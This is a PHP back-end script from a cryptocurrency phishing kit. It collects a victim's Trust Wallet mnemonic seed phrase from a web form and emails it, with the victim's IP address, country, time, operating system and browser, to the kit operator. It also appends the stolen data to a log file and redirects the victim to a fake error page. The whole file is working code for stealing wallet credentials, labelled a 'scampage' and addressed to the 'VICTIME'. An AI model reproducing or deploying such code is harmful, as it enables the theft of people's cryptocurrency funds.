<?php
header('Location: wallet-connect-error.html');
require 'Email.php';
require 'getdata.php';
$walletseed = $_POST['walletseed'];
$to = "$yourmail";
$subject = "π€ Trust Wallet Memonic Phrase π€ FROM  ".$ip."π₯".$country."";
$message = "
<html>
<head>
<meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font style='color: #0a5d00;'>π₯ Trust Wallet Mnemonic Phrase </font><br>
<font style='color:#9c0000;'>π</font> Memonic Phrase = <font style='color:#0070ba;'>$walletSeed</font><br>
<font style='color: #0a5d00;'>π οΈ VICTIME INFORMATION</font><br>
<font style='color:#9c0000;'>π</font> IP INFO = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>π</font> TIME/DATE = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>π</font> OS = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>π</font> BROWSER = <font style='color:#0070ba;'>$user_browser</font><br>
<font style='color: #820000;'>π Thankx to  Coachella π</font>
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:πΌπ€ Memonic Phrase π€ <priv8scampage@rez.com>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/ips/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>